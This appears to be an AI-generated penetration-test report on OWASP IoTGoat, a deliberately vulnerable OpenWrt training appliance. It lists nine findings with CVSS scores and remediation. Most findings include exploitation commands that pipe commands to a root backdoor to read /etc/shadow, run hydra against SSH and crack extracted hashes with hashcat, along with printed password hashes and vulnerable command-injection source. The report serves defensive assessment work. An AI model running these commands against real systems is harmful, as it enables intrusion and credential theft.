# Vulnerability Assessment Report — 172.17.0.5

**Classification:** CONFIDENTIAL — Restricted to authorized personnel  
**Generated:** 2026-08-02T18:23:38Z  
**Target:** 172.17.0.5  
**Campaign:** camp_20260802_257f75f1  
**Methodology:** ISO 27001 / NIST SP 800-115 / MITRE ATT&CK  

---

## MANAGEMENT SUMMARY

> *For non-technical readers and decision-makers.*

### Overall Security Posture: 🔴 CRITICAL — Immediate Action Required

The system tested (**172.17.0.5**) presents an **extremely poor security posture**. Our team confirmed 4 critical and 3 high severity vulnerabilities, enabling complete compromise through multiple independent attack paths.

### Most Critical Issues

**1. Unauthenticated Root Backdoor Shell (shellback) on Port 5515**  
The IoTGoat device exposes an intentional backdoor service ('shellback' v0.1-1) on TCP port 5515, registered as an init.d service and enabled by default in /etc/config/shellback. The service runs as r...

**2. Mirai Botnet Default Credentials on SSH (iotgoatuser:[REDACTED_CREDENTIAL])**  
The Dropbear SSH service on port 2222 accepts login with a well-known Mirai botnet default credential: iotgoatuser:[REDACTED_CREDENTIAL]. The password hash ($1$79bz0K8z$Ii6Q/if83F1QodGmkb4Ah.) was extracted fr...

**3. LuCI Command Injection Endpoint (webcmd) - Unsanitized io.popen() as Root**  
The LuCI web interface contains a custom IoTGoat controller at [REDACTED].lua that registers a 'webcmd' endpoint at /admin/iotgoat/webcmd. The webcmd() function takes...

### Required Actions

| Timeframe | Action |
|-----------|--------|
| **Today** | Block external access / take offline if possible |
| **This week** | Patch all critical and high severity findings |
| **2 weeks** | Address medium severity findings and security headers |
| **1 month** | Full code review and independent re-test |

---

## 1. EXECUTIVE SUMMARY

> Critical-severity penetration test of OWASP IoTGoat OpenWrt appliance at 172.17.0.5 revealed 9 vulnerabilities including an unauthenticated root backdoor shell (shellback) on port 5515 providing instant full device compromise, Mirai botnet default SSH credentials (iotgoatuser:[REDACTED_CREDENTIAL]) on Dropbear port 2222, an unsanitized command injection endpoint in LuCI, exposed /etc/shadow with weak MD5crypt hashes, permissive UPnP ACLs, unencrypted WiFi, and a severely outdated firmware stack (2017-2019) with known critical CVEs including dnsmasq RCE (CVE-2017-14491). The device is fully compromised with zero interaction required.

**Overall Risk Level: CRITICAL**

### Findings Summary

| Severity | Count | Exploited | Confirmed |
|----------|-------|-----------|----------|
| CRITICAL | 4 | 3 | 1 |
| HIGH | 3 | 0 | 3 |
| MEDIUM | 2 | 0 | 2 |
| LOW | 0 | 0 | 0 |
| INFO | 0 | 0 | 0 |
| **TOTAL** | **9** | **3** | **6** |

---

## 2. FINDINGS TABLE

| # | ID | Title | Severity | CVSS | Status | Endpoint |
|---|-----|-------|----------|------|--------|----------|
| 1 | `vuln_c0862b` | Unauthenticated Root Backdoor Shell (shellback) on... | CRITICAL | 10.0 | **EXPLOITED** | `tcp://172.17.0.5:5515` |
| 2 | `vuln_ba561a` | Mirai Botnet Default Credentials on SSH (iotgoatus... | CRITICAL | 9.8 | **EXPLOITED** | `ssh://172.17.0.5:2222` |
| 3 | `vuln_9867ac` | LuCI Command Injection Endpoint (webcmd) - Unsanit... | CRITICAL | 9.1 | Confirmed | `172.17.0.5:4443/cgi-bin/luci/admin/iotgoat/webcmd` |
| 4 | `vuln_45626a` | Exposed /etc/shadow with Crackable MD5crypt Passwo... | CRITICAL | 9.0 | **EXPLOITED** | `tcp://172.17.0.5:5515` |
| 5 | `vuln_d5846f` | Outdated and Vulnerable Software Components Across... | HIGH | 8.1 | Confirmed | `172.17.0.5 (all services)` |
| 6 | `vuln_933f32` | MiniUPnPd Exposed with Permissive ACL (allow all p... | HIGH | 7.5 | Confirmed | `tcp://172.17.0.5:5000` |
| 7 | `vuln_b0943f` | WiFi Network Configured with No Encryption (Open S... | HIGH | 7.4 | Confirmed | `WiFi SSID: OWASP IoTGoat` |
| 8 | `vuln_0dfed5` | Telnetd Service Running on Port 65534 (Internal) | MEDIUM | 6.5 | Confirmed | `tcp://172.17.0.5:65534 (internal)` |
| 9 | `vuln_04d91b` | Self-Signed TLS Certificate with Weak Configuratio... | MEDIUM | 5.3 | Confirmed | `172.17.0.5:4443` |

---

## 3. VULNERABILITY DETAILS

---

### 3.1 — Unauthenticated Root Backdoor Shell (shellback) on Port 5515

| Field | Value |
|-------|-------|
| **ID** | `vuln_c0862b` |
| **Severity** | CRITICAL |
| **CVSS Score** | 10.0 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| **Status** | EXPLOITED |
| **Category** | `remote_code_execution` |
| **MITRE ATT&CK** | `T1133` — External Remote Services |
| **ISO 27001** | `A.9.4.1` |
| **Endpoint** | `tcp://172.17.0.5:5515` |
| **Component** | shellback 0.1-1 |
| **Discovered by** | `firmware` |
| **Discovered at** | 2026-08-02T18:21:18Z |

#### Description

The IoTGoat device exposes an intentional backdoor service ('shellback' v0.1-1) on TCP port 5515, registered as an init.d service and enabled by default in /etc/config/shellback. The service runs as root (uid=0) and provides an unauthenticated interactive shell to any connecting client. No credentials are required - any TCP connection immediately grants a root shell. The backdoor binary is at /usr/bin/shellback and is launched by /etc/init.d/shellback via busybox sh. This represents a complete compromise of the device with zero interaction required.

#### Technical Analysis

Connecting to TCP port 5515 with a simple telnet/curl client immediately yields an unauthenticated root shell. The banner '[***]Successfully Connected to IoTGoat's Backdoor[***]' confirms the service identity. Running 'id' returns 'uid=0(root) gid=0(root)', proving full root-level RCE. The attacker can read /etc/shadow, /etc/passwd, modify system files, and fully control the device. The backdoor service is enabled via /etc/config/shellback with 'option enabled 1' and started at boot via /etc/init.d/shellback (START=95).

#### Exploitation Commands

```bash
echo "id" | curl -s telnet://172.17.0.5:5515 --connect-timeout 5 --max-time 8\necho -e "id\nuname -a\ncat /etc/openwrt_release\ncat /etc/passwd" | curl -s telnet://172.17.0.5:5515 --connect-timeout 5 --max-time 10\necho -e "cat /etc/shadow" | curl -s telnet://172.17.0.5:5515 --connect-timeout 5 --max-time 10
```

#### Evidence / Logs

```
[***]Successfully Connected to IoTGoat's Backdoor[***]\nuid=0(root) gid=0(root)\nLinux IoTGoat 4.14.95 #0 SMP Wed Jan 30 12:21:02 2019 i686 GNU/Linux\nDISTRIB_ID='OpenWrt'\nDISTRIB_RELEASE='18.06.2'\nDISTRIB_REVISION='r7676-cddd7b4c77'\nroot:$1$Jl7H1VOG$Wgw2F/C.nLNTC.4pwDa4H1:18145:0:99999:7:::\niotgoatuser:$1$79bz0K8z$Ii6Q/if83F1QodGmkb4Ah.:18145:0:99999:7:::
```

#### Remediation

Immediately disable and remove the shellback backdoor: 1) Run 'uci set shellback.shell_config.enabled=0 && uci commit shellback && /etc/init.d/shellback stop && /etc/init.d/shellback disable'. 2) Remove the binary: 'rm /usr/bin/shellback'. 3) Remove the init script: 'rm /etc/init.d/shellback'. 4) Remove the config: 'rm /etc/config/shellback'. 5) Audit firmware build process to ensure no backdoors are shipped in production images.

---

### 3.2 — Mirai Botnet Default Credentials on SSH (iotgoatuser:[REDACTED_CREDENTIAL])

| Field | Value |
|-------|-------|
| **ID** | `vuln_ba561a` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.8 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Status** | EXPLOITED |
| **Category** | `default_credentials` |
| **MITRE ATT&CK** | `T1078.001` — Valid Accounts: Default Accounts |
| **ISO 27001** | `A.9.2.4` |
| **Endpoint** | `ssh://172.17.0.5:2222` |
| **Component** | Dropbear 2017.75 |
| **Discovered by** | `firmware` |
| **Discovered at** | 2026-08-02T18:21:35Z |

#### Description

The Dropbear SSH service on port 2222 accepts login with a well-known Mirai botnet default credential: iotgoatuser:[REDACTED_CREDENTIAL]. The password hash ($1$79bz0K8z$Ii6Q/if83F1QodGmkb4Ah.) was extracted from /etc/shadow via the backdoor and cracked with hashcat (md5crypt mode 500), confirming the Mirai default password '[REDACTED_CREDENTIAL]'. Hydra confirms the SSH login succeeds. The user 'iotgoatuser' has UID 1000 and a login shell (/bin/ash), and shares the /root home directory. This credential is present in every Mirai botnet scanner wordlist, meaning the device would be automatically recruited into botnets.

#### Technical Analysis

The password hash for 'iotgoatuser' was extracted from /etc/shadow via the backdoor, then cracked using hashcat with md5crypt mode. The cracked password '[REDACTED_CREDENTIAL]' is a well-known Mirai botnet default credential. Hydra confirmed valid SSH login with these credentials on port 2222 (Dropbear SSH). This represents a realistic automated botnet compromise vector.

#### Exploitation Commands

```bash
hydra -l iotgoatuser -p [REDACTED_CREDENTIAL] ssh://172.17.0.5:2222 -t 1\nhashcat -m 500 '$1$79bz0K8z$Ii6Q/if83F1QodGmkb4Ah.' /tmp/biglist.txt --potfile-disable
```

#### Evidence / Logs

```
Hydra v9.2 starting\n[DATA] attacking ssh://172.17.0.5:2222/\n[2222][ssh] host: 172.17.0.5   login: iotgoatuser   password: [REDACTED_CREDENTIAL]\n1 of 1 target successfully completed, 1 valid password found\n\nhashcat result:\n$1$79bz0K8z$Ii6Q/if83F1QodGmkb4Ah.:[REDACTED_CREDENTIAL]
```

#### Remediation

1) Change the password for iotgoatuser immediately: 'passwd iotgoatuser' with a strong, unique password. 2) Consider disabling password-based SSH authentication entirely and using key-based auth. 3) Remove the iotgoatuser account if not needed. 4) Update Dropbear to a current version. 5) Implement fail2ban or equivalent rate-limiting. 6) Ensure no default credentials are shipped in firmware images.

---

### 3.3 — LuCI Command Injection Endpoint (webcmd) - Unsanitized io.popen() as Root

| Field | Value |
|-------|-------|
| **ID** | `vuln_9867ac` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.1 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` |
| **Status** | CONFIRMED |
| **Category** | `remote_code_execution` |
| **MITRE ATT&CK** | `T1059.004` — Command and Scripting Interpreter: Unix Shell |
| **ISO 27001** | `A.14.2.5` |
| **Endpoint** | `https://172.17.0.5:4443/cgi-bin/luci/admin/iotgoat/webcmd` |
| **Component** | luci-controller-iotgoat |
| **Discovered by** | `firmware` |
| **Discovered at** | 2026-08-02T18:21:53Z |

#### Description

The LuCI web interface contains a custom IoTGoat controller at [REDACTED].lua that registers a 'webcmd' endpoint at /admin/iotgoat/webcmd. The webcmd() function takes user-supplied 'cmd' parameter from HTTP POST and passes it directly to Lua's io.popen() without any input validation or sanitization, resulting in arbitrary OS command execution as root (uhttpd runs as root PID 1788). Source code extracted via backdoor confirms: 'local cmd = http.formvalue(\"cmd\") ... local fp = io.popen(tostring(cmd)..\" 2>&1\")'. The endpoint requires LuCI authentication (sysauth), but coupled with weak/default credentials, this provides a web-based RCE vector. The endpoint is behind LuCI's admin auth, making it a post-authentication command injection.

#### Technical Analysis

Source code analysis of the LuCI controller reveals a direct command injection vulnerability. The webcmd() function reads the 'cmd' POST parameter and passes it unsanitized to io.popen(), which executes the command as a shell subprocess. Since uhttpd runs as root (PID 1788), all commands execute with root privileges. The endpoint is at /admin/iotgoat/webcmd and requires LuCI session authentication. The only 'sanitization' is HTML entity encoding of '<' in the output - no input filtering exists.

#### Exploitation Commands

```bash
echo 'cat [REDACTED].lua' | curl -s telnet://172.17.0.5:5515 --connect-timeout 5 --max-time 10
```

#### Evidence / Logs

```
Source code of [REDACTED].lua:\nfunction webcmd()\n    local cmd = http.formvalue(\"cmd\")\n    if cmd then\n        local fp = io.popen(tostring(cmd)..\" 2>&1\")\n        local result = fp:read(\"*a\")\n        fp:close()\n        result = result:gsub(\"<\", \"&lt;\")\n        http.write(tostring(result))\n    end\nend\n\nEndpoint registered at: entry({\"admin\", \"iotgoat\", \"webcmd\"}, call(\"webcmd\"))
```

#### Remediation

1) Remove the IoTGoat command injection endpoint entirely from production firmware. 2) If diagnostic functionality is needed, implement a strict whitelist of allowed commands. 3) Never pass user input directly to io.popen(), os.execute(), or similar functions. 4) Run uhttpd as a non-root user with minimal privileges. 5) Implement proper input validation and output encoding.

---

### 3.4 — Exposed /etc/shadow with Crackable MD5crypt Password Hashes

| Field | Value |
|-------|-------|
| **ID** | `vuln_45626a` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.0 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L` |
| **Status** | EXPLOITED |
| **Category** | `sensitive_data_exposure` |
| **MITRE ATT&CK** | `T1003.008` — OS Credential Dumping: /etc/passwd and /etc/shadow |
| **ISO 27001** | `A.10.1.1` |
| **Endpoint** | `tcp://172.17.0.5:5515` |
| **Discovered by** | `firmware` |
| **Discovered at** | 2026-08-02T18:22:13Z |

#### Description

The /etc/shadow file is readable via the unauthenticated backdoor and contains password hashes using the weak md5crypt ($1$) algorithm. Two user accounts have crackable hashes: root ($1$Jl7H1VOG$Wgw2F/C.nLNTC.4pwDa4H1) and iotgoatuser ($1$79bz0K8z$Ii6Q/if83F1QodGmkb4Ah.). The iotgoatuser hash was cracked to '[REDACTED_CREDENTIAL]' (Mirai botnet default) in seconds using hashcat. MD5crypt is considered cryptographically weak and should not be used for password hashing on modern systems.

#### Technical Analysis

Password hashes were extracted from /etc/shadow via the unauthenticated backdoor. The iotgoatuser password was cracked in seconds using a small wordlist. Both hashes use the weak md5crypt algorithm ($1$) which can be brute-forced at approximately 58,000 hashes/second even on a single CPU core.

#### Exploitation Commands

```bash
echo 'cat /etc/shadow' | curl -s telnet://172.17.0.5:5515 --connect-timeout 5 --max-time 10\nhashcat -m 500 '$1$79bz0K8z$Ii6Q/if83F1QodGmkb4Ah.' /tmp/biglist.txt --potfile-disable
```

#### Evidence / Logs

```
root:$1$Jl7H1VOG$Wgw2F/C.nLNTC.4pwDa4H1:18145:0:99999:7:::\niotgoatuser:$1$79bz0K8z$Ii6Q/if83F1QodGmkb4Ah.:18145:0:99999:7:::\n\nhashcat result: $1$79bz0K8z$Ii6Q/if83F1QodGmkb4Ah.:[REDACTED_CREDENTIAL]
```

#### Remediation

1) Use a stronger password hashing algorithm (sha512crypt $6$ or bcrypt). 2) Set strong, unique passwords for all accounts. 3) Restrict read access to /etc/shadow to root only. 4) Remove unnecessary user accounts.

---

### 3.5 — Outdated and Vulnerable Software Components Across Entire Firmware

| Field | Value |
|-------|-------|
| **ID** | `vuln_d5846f` |
| **Severity** | HIGH |
| **CVSS Score** | 8.1 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H` |
| **Status** | CONFIRMED |
| **Category** | `outdated_component` |
| **MITRE ATT&CK** | `T1190` — Exploit Public-Facing Application |
| **ISO 27001** | `A.12.6.1` |
| **Endpoint** | `172.17.0.5 (all services)` |
| **Discovered by** | `firmware` |
| **Discovered at** | 2026-08-02T18:22:51Z |

#### Description

The IoTGoat device runs severely outdated software components from 2017-2019, all with known CVEs: (1) OpenWrt 18.06.2 (Jan 2019) - EOL, multiple CVEs; (2) Linux Kernel 4.14.95 (Jan 2019) - hundreds of known CVEs; (3) Dropbear SSH 2017.75 - CVE-2018-15599 (info leak), CVE-2017-9078 (double free); (4) dnsmasq 2.73 (2015) - CVE-2017-14491..14496 (critical RCE/heap overflow), CVE-2020-25681..25687; (5) BusyBox 1.28.4 - multiple CVEs; (6) miniupnpd 2.1 - CVE-2019-12106 (info leak); (7) mbedtls 2.14.1 - multiple CVEs including side-channel attacks; (8) uhttpd 2018-11-28 - known vulnerabilities. The firmware build date is January 30, 2019.

#### Technical Analysis

Package listing from opkg reveals the entire firmware stack is from 2017-2019 with no security updates applied. Critical components like dnsmasq 2.73 are vulnerable to remote code execution (CVE-2017-14491 - heap overflow via crafted DNS responses). Dropbear 2017.75 has known information disclosure and memory corruption vulnerabilities. The Linux kernel 4.14.95 has hundreds of known CVEs.

#### Exploitation Commands

```bash
echo -e 'opkg list-installed' | curl -s telnet://172.17.0.5:5515 --connect-timeout 5 --max-time 10\necho -e 'dnsmasq -v\\ndropbear -V\\nuname -a' | curl -s telnet://172.17.0.5:5515 --connect-timeout 5 --max-time 10
```

#### Evidence / Logs

```
OpenWrt 18.06.2 r7676-cddd7b4c77\nLinux IoTGoat 4.14.95 #0 SMP Wed Jan 30 12:21:02 2019 i686\nDropbear v2017.75\nDnsmasq version 2.73\nbusybox - 1.28.4-2\ndropbear - 2017.75-7.1\ndnsmasq-dhcpv6 - 2.73-1\nminiupnpd - 2.1-1\nlibmbedtls - 2.14.1-1\nuhttpd - 2018-11-28-cdfc902a-2\nkernel - 4.14.95-1
```

#### Remediation

1) Update to the latest stable OpenWrt release (23.x or later). 2) Apply all security patches for dnsmasq, Dropbear, kernel, and other components. 3) Implement an automated firmware update mechanism. 4) Subscribe to OpenWrt security advisories. 5) Implement a software bill of materials (SBOM) to track component versions.

---

### 3.6 — MiniUPnPd Exposed with Permissive ACL (allow all ports 0.0.0.0/0)

| Field | Value |
|-------|-------|
| **ID** | `vuln_933f32` |
| **Severity** | HIGH |
| **CVSS Score** | 7.5 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N` |
| **Status** | CONFIRMED |
| **Category** | `misconfiguration` |
| **MITRE ATT&CK** | `T1090` — Proxy |
| **ISO 27001** | `A.13.1.1` |
| **Endpoint** | `tcp://172.17.0.5:5000` |
| **Component** | miniupnpd 2.1-1 |
| **Discovered by** | `firmware` |
| **Discovered at** | 2026-08-02T18:22:31Z |

#### Description

MiniUPnPd 2.1-1 is running on port 5000 with an extremely permissive ACL rule: 'allow 1024-65535 0.0.0.0/0 0-65535'. This permits any host on the network to add arbitrary port forwarding rules to the device's NAT table, enabling: (1) Forwarding of internal services to external interfaces, (2) Port-mapping based attacks to expose internal network services, (3) NAT table manipulation. Additionally, 'secure_mode=no' means clients are NOT restricted to adding mappings only for their own IP, amplifying the risk. The 'pcp_allow_thirdparty=no' is insufficient mitigation.

#### Technical Analysis

The miniupnpd configuration extracted from the device shows the UPnP daemon is running with 'secure_mode=no' and a wildcard ACL allowing any IP to create port mappings for any port range. This is a dangerous misconfiguration that allows network-level attacks including NAT manipulation and internal service exposure.

#### Exploitation Commands

```bash
echo 'cat /var/etc/miniupnpd.conf' | curl -s telnet://172.17.0.5:5515 --connect-timeout 5 --max-time 10
```

#### Evidence / Logs

```
ext_ifname=br-lan\nlistening_ip=br-lan\nport=5000\nenable_natpmp=yes\nenable_upnp=yes\nsecure_mode=no\npcp_allow_thirdparty=no\nsystem_uptime=yes\nforce_igd_desc_v1=no\nlease_file=/var/run/miniupnpd.leases\nbitrate_down=8388608\nbitrate_up=4194304\nuuid=cec11264-31c0-4ada-88de-b7ba13ec05fe\nallow 1024-65535 0.0.0.0/0 0-65535 #Allow all ports
```

#### Remediation

1) Disable UPnP if not required: 'uci set upnpd.config.enabled=0'. 2) If UPnP is needed, enable secure_mode to restrict clients to their own IP mappings. 3) Restrict the ACL to specific IP ranges and port ranges. 4) Update miniupnpd to the latest version. 5) Monitor UPnP port mapping requests.

---

### 3.7 — WiFi Network Configured with No Encryption (Open SSID)

| Field | Value |
|-------|-------|
| **ID** | `vuln_b0943f` |
| **Severity** | HIGH |
| **CVSS Score** | 7.4 |
| **CVSS Vector** | `CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` |
| **Status** | CONFIRMED |
| **Category** | `misconfiguration` |
| **MITRE ATT&CK** | `T1557` — Adversary-in-the-Middle |
| **ISO 27001** | `A.13.1.1` |
| **Endpoint** | `WiFi SSID: OWASP IoTGoat` |
| **Discovered by** | `firmware` |
| **Discovered at** | 2026-08-02T18:23:02Z |

#### Description

The wireless interface is configured with SSID 'OWASP IoTGoat' and encryption set to 'none' in /etc/config/wireless. This means all wireless traffic is transmitted in cleartext, allowing any nearby attacker to: (1) Sniff all network traffic including credentials, (2) Perform man-in-the-middle attacks, (3) Connect to the device without any authentication, (4) Access the LuCI admin interface and all exposed services.

#### Technical Analysis

The wireless configuration file shows 'option encryption none' for the IoTGoat access point. This provides zero wireless security, allowing any device in range to connect and intercept traffic.

#### Exploitation Commands

```bash
echo 'cat /etc/config/wireless' | curl -s telnet://172.17.0.5:5515 --connect-timeout 5 --max-time 10
```

#### Evidence / Logs

```
config wifi-device 'wl0'\n\toption type 'mac80211'\n\toption hwmode '11a'\n\toption channel 'auto'\n\toption legacy_rates '1'\n\nconfig wifi-iface\n\toption device 'wl0'\n\toption mode 'ap'\n\toption encryption 'none'\n\toption network 'lan'\n\toption ssid 'OWASP IoTGoat'
```

#### Remediation

1) Enable WPA3-SAE or at minimum WPA2-PSK encryption: 'uci set wireless.@wifi-iface[0].encryption=psk2+ccmp'. 2) Set a strong wireless password. 3) Consider implementing 802.1X enterprise authentication for IoT device management networks.

---

### 3.8 — Telnetd Service Running on Port 65534 (Internal)

| Field | Value |
|-------|-------|
| **ID** | `vuln_0dfed5` |
| **Severity** | MEDIUM |
| **CVSS Score** | 6.5 |
| **CVSS Vector** | `CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| **Status** | CONFIRMED |
| **Category** | `insecure_service` |
| **MITRE ATT&CK** | `T1021.001` — Remote Services |
| **ISO 27001** | `A.13.1.1` |
| **Endpoint** | `tcp://172.17.0.5:65534 (internal)` |
| **Component** | telnetd (busybox) |
| **Discovered by** | `firmware` |
| **Discovered at** | 2026-08-02T18:23:13Z |

#### Description

The device runs a telnetd service (PID 1984) on port 65534, which transmits credentials and all session data in cleartext. While this port was not externally reachable in port scanning, it is listening on the device and could be exposed via UPnP port forwarding or firewall changes. Telnet is inherently insecure as it provides no encryption for authentication or session data.

#### Technical Analysis

Process listing and netstat output confirm telnetd is running on port 65534, started as root. This insecure protocol can be exploited if exposed via UPnP or network reconfiguration.

#### Exploitation Commands

```bash
echo 'netstat -tlnp | grep telnet' | curl -s telnet://172.17.0.5:5515 --connect-timeout 5 --max-time 10\necho 'ps w | grep telnet' | curl -s telnet://172.17.0.5:5515 --connect-timeout 5 --max-time 10
```

#### Evidence / Logs

```
tcp  0  0 :::65534  :::*  LISTEN  1984/telnetd\n1984 root  1000 S  telnetd -p 65534
```

#### Remediation

1) Disable telnetd entirely and use SSH for remote administration. 2) If telnet is needed for emergency recovery, restrict it to localhost only. 3) Ensure firewall rules block telnet from external access.

---

### 3.9 — Self-Signed TLS Certificate with Weak Configuration

| Field | Value |
|-------|-------|
| **ID** | `vuln_04d91b` |
| **Severity** | MEDIUM |
| **CVSS Score** | 5.3 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` |
| **Status** | CONFIRMED |
| **Category** | `misconfiguration` |
| **MITRE ATT&CK** | `T1557` — Adversary-in-the-Middle |
| **ISO 27001** | `A.10.1.2` |
| **Endpoint** | `https://172.17.0.5:4443` |
| **Discovered by** | `firmware` |
| **Discovered at** | 2026-08-02T18:23:24Z |

#### Description

The uhttpd HTTPS service on port 4443 uses a self-signed certificate (issuer: C=ZZ; ST=Somewhere; L=Unknown; O=OpenWrtee2ed6bd; CN=OpenWrt) with TLSv1.2 / ECDHE-RSA-AES128-GCM-SHA256. The certificate is auto-generated with generic metadata that reveals the device identity. Self-signed certificates are vulnerable to MITM attacks as they cannot be verified by clients. The ALPN negotiation also failed ('server did not agree to a protocol').

#### Technical Analysis

The TLS handshake reveals a self-signed certificate with placeholder location information, indicating no PKI infrastructure is in place. This allows man-in-the-middle attacks against the admin interface.

#### Exploitation Commands

```bash
curl -vk https://172.17.0.5:4443/ 2>&1 | grep -A5 'Server certificate'
```

#### Evidence / Logs

```
* Server certificate:\n*  subject: C=ZZ; ST=Somewhere; L=Unknown; O=OpenWrtee2ed6bd; CN=OpenWrt\n*  start date: Aug  2 17:24:11 2026 GMT\n*  expire date: Aug  1 17:24:11 2028 GMT\n*  issuer: C=ZZ; ST=Somewhere; L=Unknown; O=OpenWrtee2ed6bd; CN=OpenWrt\n*  SSL certificate verify result: self-signed certificate (18)\n* SSL connection using TLSv1.2 / ECDHE-RSA-AES128-GCM-SHA256
```

#### Remediation

1) Deploy a proper CA-signed certificate or use a managed PKI. 2) Configure uhttpd to use stronger TLS settings. 3) Enable HSTS headers. 4) Consider using ACME/Let's Encrypt for automated certificate management if the device has internet access.

---

## 4. REMEDIATION ROADMAP

### P0 — Immediate (< 24h)

| Finding | Effort |
|---------|--------|
| Unauthenticated Root Backdoor Shell (shellback) on Port 5515 | High |
| Mirai Botnet Default Credentials on SSH (iotgoatuser:7ujMko0... | High |
| LuCI Command Injection Endpoint (webcmd) - Unsanitized io.po... | High |
| Exposed /etc/shadow with Crackable MD5crypt Password Hashes | High |

### P1 — Short term (< 1 week)

| Finding | Effort |
|---------|--------|
| Outdated and Vulnerable Software Components Across Entire Fi... | High |
| MiniUPnPd Exposed with Permissive ACL (allow all ports 0.0.0... | High |
| WiFi Network Configured with No Encryption (Open SSID) | High |

### P2 — Medium term (< 2 weeks)

| Finding | Effort |
|---------|--------|
| Telnetd Service Running on Port 65534 (Internal) | High |
| Self-Signed TLS Certificate with Weak Configuration | High |

---

*Report auto-generated by Darkmoon AI Security Platform*  
*Classification: CONFIDENTIAL — Restricted to authorized personnel*  
*Generated: 2026-08-02T18:23:38Z*  
*Campaign: camp_20260802_257f75f1 | Target: 172.17.0.5*
